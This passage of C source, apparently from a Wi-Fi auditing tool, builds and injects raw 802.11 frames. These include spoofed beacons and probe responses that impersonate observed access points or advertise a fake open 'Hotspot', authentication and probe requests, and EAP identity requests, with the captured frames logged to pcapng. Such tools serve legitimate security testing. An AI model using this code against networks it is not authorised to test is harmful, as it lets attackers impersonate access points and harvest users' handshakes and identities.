#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE) < 0)
	{
	perror("\nfailed to transmit authenticationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_probe_resp_open()
{
static mac_t *macftx;
static capap_t *capap;
const uint8_t proberesponsedata[] =
{
/* Tag: BC SSID Hotspot*/
0x00, 0x07, 0x48, 0x6f, 0x74, 0x73, 0x70, 0x6f, 0x74,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,

0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00

};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, &mac_myapopen, 6);
memcpy(macftx->addr3, &mac_myapopen, 6);
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x401;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &proberesponsedata, PROBERESPONSE_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +0x15] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +PROBERESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit proberesponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_probe_resp(uint8_t *client, macessidlist_t *zeigerap)
{
static mac_t *macftx;
static capap_t *capap;
const uint8_t proberesponsedata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, client, 6);
memcpy(macftx->addr2, zeigerap->ap, 6);
memcpy(macftx->addr3, zeigerap->ap, 6);
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = zeigerap->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], zeigerap->essid, zeigerap->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen], &proberesponsedata, PROBERESPONSE_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +0x0c] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +PROBERESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit proberesponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_proberequest_directed(uint8_t *macap, int essid_len, uint8_t *essid)
{
static mac_t *macftx;

static const uint8_t directedproberequestdata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define DIRECTEDPROBEREQUEST_SIZE sizeof(directedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +DIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, &mac_myprclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +1] = essid_len;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE], essid, essid_len);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len], &directedproberequestdata, DIRECTEDPROBEREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len +DIRECTEDPROBEREQUEST_SIZE) < 0)
	{
	perror("\nfailed to transmit directed proberequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_proberequest_undirected_broadcast()
{
static mac_t *macftx;

static const uint8_t undirectedproberequestdata[] =
{
0x00, 0x00,
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myprclient, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE) < 0)
	{
	perror("\nfailed to transmit undirected proberequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_beacon_active()
{
static mac_t *macftx;
static capap_t *capap;
static const uint8_t reactivebeacondata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x0c,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REACTIVEBEACON_SIZE sizeof(reactivebeacondata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +REACTIVEBEACON_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, rgbeaconptr->ap, 6);
memcpy(macftx->addr3, rgbeaconptr->ap, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = rgbeaconptr->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], rgbeaconptr->essid, rgbeaconptr->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen], &reactivebeacondata, REACTIVEBEACON_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen +0x0c] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen +REACTIVEBEACON_SIZE) < 0)
	{
	perror("\nfailed to transmit internal beacon");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
rgbeaconptr++;
if(rgbeaconptr >= rglist +RGLIST_MAX) rgbeaconptr = rglist;
if(rgbeaconptr->timestamp == 0) rgbeaconptr = rglist;
return;
}
/*===========================================================================*/
static inline void send_beacon_list_active()
{
static mac_t *macftx;
static capap_t *capap;
static const uint8_t reactivebeacondata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x0c,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REACTIVEBEACON_SIZE sizeof(reactivebeacondata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +REACTIVEBEACON_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, rgbeaconlistptr->ap, 6);
memcpy(macftx->addr3, rgbeaconlistptr->ap, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = rgbeaconlistptr->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], rgbeaconlistptr->essid, rgbeaconlistptr->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen], &reactivebeacondata, REACTIVEBEACON_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen +0x0c] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen +REACTIVEBEACON_SIZE) < 0)
	{
	perror("\nfailed to transmit internal beacon");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
rgbeaconlistptr++;
if(rgbeaconlistptr >= rgbeaconlist +RGLIST_MAX) rgbeaconlistptr = rgbeaconlist;
if(rgbeaconlistptr->timestamp == 0) rgbeaconlistptr = rgbeaconlist;
return;
}
/*===========================================================================*/
static void send_beacon_hidden()
{
static mac_t *macftx;
static capap_t *capap;

static const uint8_t bcbeacondata[] =
{
/* Tag: BC SSID HIDDEN*/
0x00, 0x00,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x0c,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define BCBEACON_SIZE sizeof(bcbeacondata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BCBEACON_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myaphidden, 6);
memcpy(macftx->addr3, &mac_myaphidden, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &bcbeacondata, BCBEACON_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +0x0e] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BCBEACON_SIZE) < 0)
	{
	perror("\nfailed to transmit internal beacon");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_beacon_open()
{
static mac_t *macftx;
static capap_t *capap;

static const uint8_t bcbeacondata[] =
{
/* Tag: BC SSID Hotspot*/
0x00, 0x07, 0x48, 0x6f, 0x74, 0x73, 0x70, 0x6f, 0x74,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
/* Tag: WMM/WME element */
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define BCBEACON_SIZE sizeof(bcbeacondata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BCBEACON_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myapopen, 6);
memcpy(macftx->addr3, &mac_myapopen, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x401;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &bcbeacondata, BCBEACON_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +0x15] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BCBEACON_SIZE) < 0)
	{
	perror("\nfailed to transmit internal beacon");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211exteap_mka()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap_asf()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void send_eap_request_id()
{
static mac_t *macftx;
static const uint8_t requestidentitydata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x01, 0x00, 0x00, 0x0a, 0x01, 0x63, 0x00, 0x05, 0x01
};
#define REQUESTIDENTITY_SIZE sizeof(requestidentitydata)
static uint8_t packetout[1024];

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->from_ds = 1;
macftx->duration = 0x002c;
macftx->sequence = 0;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &requestidentitydata, REQUESTIDENTITY_SIZE);
if(write(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE) < 0)
	{
	perror("\nfailed to transmit request identity");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void printown(ownlist_t *zeiger, char *msg)
{
static int c, p;
static macessidlist_t *zeigerap;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

p = 0;
for(c = 0; c < zeiger->essidlen; c++)
	{
	if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
	else if(zeiger->essid[c] == 0x5c)
		{
		essidstring[p++] = 0x5c;
		essidstring[p++] = 0x5c;
		}
	else essidstring[p++] = zeiger->essid[c];
	}
essidstring[p] = 0;
if(essidstring[0] == 0)
	{
	for(zeigerap = aplist; zeigerap < aplist +APLIST_MAX; zeigerap++)
		{
		if(memcmp(zeigerap->ap, zeiger->ap, 6) == 0)
			{
			p = 0;
			for(c = 0; c < zeigerap->essidlen; c++)
				{
				if((zeigerap->essid[c] < 0x20) || (zeigerap->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerap->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerap->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
if(essidstring[0] == 0)
	{
	for(zeigerap = rglist; zeigerap < rglist +RGLIST_MAX; zeigerap++)
		{
		if(memcmp(zeigerap->ap, zeiger->ap, 6) == 0)
			{
			p = 0;
			for(c = 0; c < zeigerap->essidlen; c++)
				{
				if((zeigerap->essid[c] < 0x20) || (zeigerap->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerap->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerap->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(essidstring[0] != 0)
	{
	snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, channelscanlist[cpa],
		zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
		zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
		essidstring, msg);
	}
else
	{
	snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s]\n", timestring, channelscanlist[cpa],
		zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
		zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
		msg);
	}
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void process80211exteap_resp_id(uint16_t exteaplen)
{
static ownlist_t *zeiger;

if(exteaplen < EAPAUTH_SIZE) return;
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if((memcmp(zeiger->ap, macfrx->addr1, 6) != 0) && (memcmp(zeiger->client, macfrx->addr2, 6) != 0)) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((zeiger->status &OW_EAP_RESP) != OW_EAP_RESP)
			{
			zeiger->status |= OW_EAP_RESP;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
